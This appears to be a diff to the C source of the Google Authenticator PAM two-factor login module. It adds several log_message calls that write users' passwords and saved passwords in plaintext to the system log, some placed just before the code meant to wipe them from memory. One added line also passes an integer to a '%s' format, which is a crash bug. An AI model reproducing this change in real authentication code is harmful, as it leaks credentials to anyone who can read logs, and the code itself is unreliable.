@@ -1388,9 +1388,8 @@ static int google_authenticator(pam_handle_t *pamh, int flags,
       case 1: // Extract possible scratch code
         if (params.pass_mode == USE_FIRST_PASS ||
             params.pass_mode == TRY_FIRST_PASS) {
-          pw = get_first_pass(pamh);
-              log_message(LOG_ERR, pamh, "Password '%s'", pw);
-
+            pw = get_first_pass(pamh);
+            log_message(LOG_ERR, pamh, "Password '%s'", pw);
         }
         break;
       default:
@@ -1414,7 +1413,7 @@ static int google_authenticator(pam_handle_t *pamh, int flags,
           }
           if (saved_pw) {
             pw = strdup(saved_pw);
-                          log_message(LOG_ERR, pamh, "Password2 '%s'", pw);
+                          log_message(LOG_ERR, pamh, "Savedpw 1417 '%s'", saved_pw);
 
           }
         }
@@ -1506,13 +1505,14 @@ static int google_authenticator(pam_handle_t *pamh, int flags,
         rc = PAM_SESSION_ERR;
       }
     }
-
     // Clear out password and deallocate memory
     if (pw) {
+      log_message(LOG_ERR, pamh, "St1509: %s", pw);
       memset(pw, 0, strlen(pw));
       free(pw);
     }
     if (saved_pw) {
+      log_message(LOG_ERR, pamh, "St1510: %s", saved_pw);
       memset(saved_pw, 0, strlen(saved_pw));
       free(saved_pw);
     }
@@ -1531,6 +1531,7 @@ static int google_authenticator(pam_handle_t *pamh, int flags,
     // If nothing matched, display an error message
     if (rc != PAM_SUCCESS) {
       log_message(LOG_ERR, pamh, "Invalid verification code");
+      log_message(LOG_ERR, pamh, "St: %s", rc);
     }
   }
 
